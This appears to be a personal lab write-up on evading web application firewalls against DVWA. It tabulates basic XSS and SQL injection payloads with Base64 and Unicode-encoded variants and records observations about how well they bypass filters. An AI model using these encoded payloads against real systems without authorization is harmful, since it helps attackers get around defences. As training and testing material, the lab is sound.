# 🧬 Base64 & Unicode Evasion

## 🎯 Objective
Evade WAF filters by transforming payloads using Base64 encoding and Unicode injection. These techniques are often overlooked by simple signature-based filters.

---

## 🛠️ Tools Used
- CyberChef (to encode payloads)
- Burp Suite Repeater (for injection)
- DVWA or test environment with ModSecurity/Cloudflare WAF

---

## 📍 Target
- **URL/IP:** http://192.168.1.110  
- **Environment:** DVWA behind WAF

---

## 🔤 Payload Examples

| Technique             | Original Payload            | Encoded Version                                |
|-----------------------|-----------------------------|------------------------------------------------|
| **XSS - Base64**      | `<script>alert(1)</script>` | `PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`         |
| **XSS - Unicode**     | `<script>alert(1)</script>` | `\u003Cscript\u003Ealert(1)\u003C/script\u003E` |
| **SQLi - Base64**     | `' OR 1=1--`                | `JyBPUiAxPTEtLQ==`                              |
| **SQLi - Unicode**    | `' OR 1=1--`                | `\u0027\u0020OR\u00201\u003D1--`               |

---

## 📂 Output Files

- `transformed-payloads/base64-unicode-tests.txt`  
- `screenshots/base64-unicode-response.png`

---

## 🔍 Observations
- Base64 payloads often bypass initial filters
- Unicode can confuse parsing engines and avoid detection
- Context matters: decoding is required server-side for attack to succeed

---

## 🧠 What I Learned
- Practical encoding methods to evade WAF detection
- Importance of testing payloads with multiple encodings
- Strategic bypass planning based on filter behavior

---

## 🙋 About Me
I’m a Blue Teamer transitioning into Red Teaming, building real-world WAF evasion labs.

🔗 [Connect on LinkedIn](https://www.linkedin.com/in/aditya-kumar-goswami)  
📁 GitHub: [Aditya-Sec](https://github.com/Aditya-Sec)
